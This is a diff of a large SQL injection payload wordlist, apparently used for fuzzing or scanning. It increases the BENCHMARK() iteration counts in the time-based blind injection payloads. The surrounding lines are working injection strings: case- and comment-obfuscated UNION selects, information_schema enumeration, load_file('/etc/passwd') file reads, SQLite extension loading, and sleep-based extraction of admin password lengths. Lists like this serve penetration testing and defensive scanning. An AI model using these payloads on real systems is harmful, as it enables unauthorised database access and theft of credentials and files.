@@ -45,10 +45,10 @@
  AND UnION(((((((SeLECt(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
  AND UnION(((((((seLEcT(1),(2),(3)))))))) -- -
  AND UnIoN(((((((sEleCT(1),(2),(3),(4)))))))) --
- AND benchmark(2000,md5(now()))
- AND benchmark(2000,md5(now()))--
- AND benchmark(2000,md5(now())) --
- AND benchmark(2000,md5(now())) -- - 
+ AND benchmark(20000000,md5(now()))
+ AND benchmark(20000000,md5(now()))--
+ AND benchmark(20000000,md5(now())) --
+ AND benchmark(20000000,md5(now())) -- - 
  AND cAse WhEN sqlITe_VersiON() lIkE '3.%' Then 1 elsE LoAD_eXTeNsiOn(1) eND--
  AND seLEcT IF(1=1,(seLECt 1 UNiOn sElEct 2),2)
  AND strcmp(left('password',1), 0x69) = 1-- 
@@ -199,11 +199,11 @@
  OR UniOn(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
  OR UnioN(((((((seLect(1),(2),(3))))))))
  OR a=A
- OR bEnchMaRK(2000,md5(NOW()))--
- OR benchmark(2000,md5(now()))
- OR benchmark(2000,md5(now()))--
- OR benchmark(2000,md5(now())) --
- OR benchmark(2000,md5(now())) -- - 
+ OR bEnchMaRK(20000000,md5(NOW()))--
+ OR benchmark(20000000,md5(now()))
+ OR benchmark(20000000,md5(now()))--
+ OR benchmark(20000000,md5(now())) --
+ OR benchmark(20000000,md5(now())) -- - 
  OR cASe WHEn sQliTe_veRSION() LiKE '3.%' theN 1 Else Load_EXtENSiON(1) enD --
  OR strcmp(left('password',1), 0x69) = 1
  OR strcmp(left('password',1), 0x69) = 1--
@@ -258,8 +258,8 @@
  Or UnIoN(((((((seLEcT(1),(2),(3),(4),(5)))))))) --
  Or UniOn(((((((SEleCT(1))))))))
  Or a = A
- Or bENchMaRK(2000,md5(nOW())) --
- Or bEnCHMArk(2000,mD5(now())) -- - 
+ Or bENchMaRK(20000000,md5(nOW())) --
+ Or bEnCHMArk(20000000,mD5(now())) -- - 
  Or cASe wHEN sqLite_VERsiON() liKE '3.%' THEn 1 elSE loAD_exTENSIon(1) enD
  Or sELEcT chaR(0x66)--
  Or sELect IF(1=1,(SelECT 1 uNIon SElEcT 2),2)--
@@ -274,10 +274,10 @@
  Or un/**/Ion+SeL/**/EcT+1,2,3,4,5,6,7,8,9,10
  Or uniON(((((((SeLeCt(1),(2),(3))))))))
  Or uniOn(((((((seLeCT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
- PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1)
- PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1)--
- PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1) --
- PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1) -- -
+ PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1)
+ PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1)--
+ PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1) --
+ PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1) -- -
  SELECT 0x5045
  SELECT 0x5045--
  SELECT 0x5045 --
@@ -327,7 +327,7 @@
  aND UnIoN+sELECT+0,coNcaT_WS(0X3a,tABLe_name,ColUmN_NAMe)+From+INFOrmaTIon_sCHema.cOluMNs
  aND UnioN(((((((SeleCt(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
  aND Union(((((((sElecT(1),(2),(3),(4))))))))--
- aND bEnchMaRK(2000,mD5(now())) --
+ aND bEnchMaRK(20000000,mD5(now())) --
  aND cAse WHEN sQLITe_VERSioN() liKe '3.%' tHeN 1 eLSE LOad_eXTeNsioN(1) end -- -
  aND uN/**/Ion+Sel/**/ecT+1,2,3,4,5,6,7,8,9,10 -- -
  aND uNIOn(((((((seLECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
@@ -341,7 +341,7 @@
  aNd 5<=>4
  aNd 'tExT' = n'text'
  aNd (sElEct leNgTh(tbL_NaME) FROm SQlItE_masTeR WHerE TYpe='table' AnD TBL_nAME Not LIKE 'sQlITe_%' lIMit 1 offsET 0)=tablE_NaMe_lengTH_NumBEr
- aNd BEnChMArK(2000,mD5(nOw()))--
+ aNd BEnChMArK(20000000,mD5(nOw()))--
  aNd SLEEp(__TimE__)='
  aNd SeleCT conCaT(CHAR(72),chAr(65),ChAR(67),CHAR(75),ChaR(69),Char(82)) --
  aNd UN/**/Ion+Sel/**/ect+1,2,3,4,5--
@@ -353,7 +353,7 @@
  aNd UnioN(((((((sELECT(1)))))))) --
  aNd Union(((((((SelEct(1)))))))) --
  aNd Union(((((((sELeCT(1),(2),(3))))))))
- aNd benCHmArK(2000,mD5(nOw()))
+ aNd benCHmArK(20000000,mD5(nOw()))
  aNd sELEcT CHaR(0x66) -- -
  aNd uN/**/ion+seL/**/ect+1,2,3,4,5,6,7,8,9 --
  aNd uNiOn(((((((seLECt(1),(2),(3),(4),(5),(6),(7),(8))))))))--
@@ -447,7 +447,7 @@
  and /*union*/union/*select*/select+1,2,3/*
  and /*union*/union/*select*/select+1,2/*
  and /*union*/union/*select*/select+1/*
- and BeNCHMARk(2000,md5(NoW())) -- - 
+ and BeNCHMARk(20000000,md5(NoW())) -- - 
  and StrcMp(LEFT('PasSwOrd',1), 0X69) = 1-- 
  and UN/**/ION+Sel/**/ECT+1,2,3,4,5,6,7,8,9,10 --
  and UNiON SelECT (CaSe wHeN SQliTe_VeRSiOn() LIKe '3.%' Then 'HERE' ELsE RAndombloB(50000000) EnD)
@@ -635,7 +635,7 @@
  oR 'Text' > 't'
  oR 'uNUsUaL' = 'uNuSUAL'
  oR /*UNIon*/UnIOn/*sEleCt*/seleCT+1,2,3,4,5,6,7/*
- oR BENcHmark(2000,MD5(now()))
+ oR BENcHmark(20000000,MD5(now()))
  oR CASe wHen SqlItE_VeRsIon() liKE '3.%' THEn 1 ELSE loAD_EXtENsIOn(1) eND -- -
  oR CasE wHEn SqlitE_veRsiOn() LiKe '3.%' THen 1 elsE loAD_eXteNSIOn(1) eND--
  oR STrcMP(LEFt('pasSWoRD',1), 0X69) = 1 -- -
@@ -1474,10 +1474,10 @@ $
 ' AND UnIOn(((((((SeLEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
 ' AND UniON(((((((SeleCt(1),(2),(3),(4),(5)))))))) --
 ' AND Union(((((((SELECt(1),(2),(3))))))))--
-' AND benchmark(2000,md5(now()))
-' AND benchmark(2000,md5(now()))--
-' AND benchmark(2000,md5(now())) --
-' AND benchmark(2000,md5(now())) -- -
+' AND benchmark(20000000,md5(now()))
+' AND benchmark(20000000,md5(now()))--
+' AND benchmark(20000000,md5(now())) --
+' AND benchmark(20000000,md5(now())) -- -
 ' AND cAse wHen SqLITe_VeRsioN() Like '3.%' then 1 ELSe LoAd_eXTENSioN(1) End -- -
 ' AND seLECT 0x5045
 ' AND strcmp(left('password',1), 0x69) = 1
@@ -1526,8 +1526,8 @@ $
 ' ANd 5 iS nuLl
 ' ANd 'SOMeTHINg' = 'sOME'+'tHInG'
 ' ANd /*uniON*/unION/*select*/sEleCT+1,2,3,4/*
-' ANd BeNCHmaRk(2000,mD5(now())) -- -
-' ANd BeNcHmArK(2000,mD5(nOW()))--
+' ANd BeNCHmaRk(20000000,mD5(now())) -- -
+' ANd BeNcHmArK(20000000,mD5(nOW()))--
 ' ANd CHAr(32)=' '
 ' ANd CasE wHen sQLitE_vErsiOn() LIke '3.%' then 1 elsE LOad_extENSiON(1) eND--
 ' ANd SEleCt iF(1=1,(SElECT 1 UNiOn seLect 2),2) -- -
@@ -1713,12 +1713,12 @@ $
 ' OR UnIOn(((((((selEct(1),(2),(3),(4),(5)))))))) -- -
 ' OR UnIoN selecT load_fiLE("/etc/PassWD")--
 ' OR UnIoN(((((((SELeCT(1),(2),(3),(4),(5),(6),(7))))))))--
-' OR bENcHmaRk(2000,MD5(now())) -- -
-' OR bEnChMark(2000,md5(nOW())) --
-' OR benchmark(2000,md5(now()))
-' OR benchmark(2000,md5(now()))--
-' OR benchmark(2000,md5(now())) --
-' OR benchmark(2000,md5(now())) -- -
+' OR bENcHmaRk(20000000,MD5(now())) -- -
+' OR bEnChMark(20000000,md5(nOW())) --
+' OR benchmark(20000000,md5(now()))
+' OR benchmark(20000000,md5(now()))--
+' OR benchmark(20000000,md5(now())) --
+' OR benchmark(20000000,md5(now())) -- -
 ' OR caSE wHEn SqLite_veRsiOn() LIkE '3.%' tHEN 1 ELse LoAd_eXTensIoN(1) End --
 ' OR iF(Length((seleCt PASswORD From USeRs WheRe LOGIn='AdmIniSTrATOr'))>5, sleep(5), 0)--
 ' OR iF(lENGtH((SEleCt PAsSWoRD FRoM uSErS wHeRE lOgIN='Root'))>5, slEEP(5), 0)
@@ -1886,7 +1886,7 @@ $
 ' aND ''='
 ' aND /*UnIOn*/UNiON/*SElect*/SeleCT+1,2,3,4,5/*
 ' aND /*uNiOn*/UNion/*sELEcT*/sELECT+1/*
-' aND BENchmArK(2000,Md5(now())) --
+' aND BENchmArK(20000000,Md5(now())) --
 ' aND SELeCt Char(0x66)--
 ' aND SlEEP(__TIMe__)#
 ' aND UN/**/ION+sel/**/ecT+1,2,3,4,5,6,7,8,9,10
@@ -1933,7 +1933,7 @@ $
 ' aNd 'wHATEVer' in ('WhaTEVER')
 ' aNd (ExISts)
 ' aNd /*unION*/UNiOn/*SElEcT*/SELect+1,2,3,4,5,6,7,8/*
-' aNd BEnCHmark(2000,mD5(NOW()))
+' aNd BEnCHmark(20000000,mD5(NOW()))
 ' aNd BEnChmARk(10000000,mD5(1))#
 ' aNd UN/**/ION+SEl/**/ect+1,2--
 ' aNd UNION(((((((SeLEct(1),(2),(3),(4)))))))) -- -
@@ -2245,7 +2245,7 @@ $
 ' oR /*UNION*/unIOn/*SELeCT*/seLECt+1/*
 ' oR /*unIOn*/uniON/*SeLEct*/SelECT+1,2,3,4,5,6,7/*
 ' oR /*union*/uNIoN/*selEct*/SeLeCT+1,2/*
-' oR BEnchmark(2000,mD5(now()))--
+' oR BEnchmark(20000000,mD5(now()))--
 ' oR IF(lENGTH((selecT paSswORd FrOM UseRs WHerE LOGin='ADmin'))>5, SlEeP(5), 0) -- -
 ' oR IF(lENgTh((SeleCT PasSWOrD From UseRS WhEre login='admin'))>5, SLeep(5), 0) --
 ' oR SELect iF((sElecT VersION()) like "%a%", Sleep(10), NUll)
@@ -2264,7 +2264,7 @@ $
 ' oR UnIon(((((((sElECt(1),(2),(3),(4))))))))--
 ' oR UserNaME lIKE '%
 ' oR a=A
-' oR beNChmArk(2000,mD5(Now()))
+' oR beNChmArk(20000000,mD5(Now()))
 ' oR cASe WheN SQlItE_vErSIOn() Like '3.%' tHeN 1 ELse loAD_eXteNSION(1) eNd--
 ' oR iF(lenGTH((selEcT PaSSWOrd froM UserS wherE LOgiN='adMIN'))>5, slEep(5), 0)--
 ' oR sELEcT coUNt(*),cOnCaT(0x3a,0X3a,(seLeCT TABLe_nAMe frOM InFORmATIon_schEma.TablEs whERe tAbLE_SCHemA=dAtaBaSE() LIMIt 1,1),0x3a,0X3a, FloOr(RAnD() * 2))a FRom INFORmAtiON_ScHeMa.ColuMNs gRouP By A
@@ -5297,7 +5297,7 @@ HI' or 1=1 --
 HI') oR ('A'='a
 Hi or a=A
 Hi' Or 'a'='A
-IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(20000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(20000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(20000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 MID((1),1,1) -- -
 MId((1),1,1)/**/--/**/-
 MiD((1),1,1) --
@@ -5314,10 +5314,10 @@ Or tRUE--
 PG_SleEp(__TiMe__)--
 PRINT
 PRINT @@variable
-PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1)
-PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1)--
-PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1) --
-PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x746b7170))))),1) -- -
+PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1)
+PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1)--
+PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1) --
+PROCEDURE ANALYSE(EXTRACTVALUE(4838,CONCAT(0x5c,(BENCHMARK(50000000,MD5(0x746b7170))))),1) -- -
 Pass1234.
 Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
 Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
@@ -5749,7 +5749,7 @@ hi' or 1=1 --
 hi' or 'a'='a
 hi' or 'x'='x';
 hi') or ('a'='a
-iF(suBstr(@@VERSIoN,1,1)<5,BENChmark(2000000,SHa1(0xDe7ec71f1)),sleEP(1))/*'XoR(If(SUBstr(@@vERSION,1,1)<5,BEnCHmArk(2000000,sHa1(0XdE7Ec71F1)),sLEep(1)))OR'|"XoR(if(sUbsTR(@@vErsiOn,1,1)<5,bEncHMaRk(2000000,Sha1(0XdE7Ec71F1)),sleEP(1)))oR"*/
+iF(suBstr(@@VERSIoN,1,1)<5,BENChmark(20000000,SHa1(0xDe7ec71f1)),sleEP(1))/*'XoR(If(SUBstr(@@vERSION,1,1)<5,BEnCHmArk(20000000,sHa1(0XdE7Ec71F1)),sLEep(1)))OR'|"XoR(if(sUbsTR(@@vErsiOn,1,1)<5,bEncHMaRk(20000000,Sha1(0XdE7Ec71F1)),sleEP(1)))oR"*/
 like '%'
 mID((1),1,1)
 mId((1),1,1)/**/--
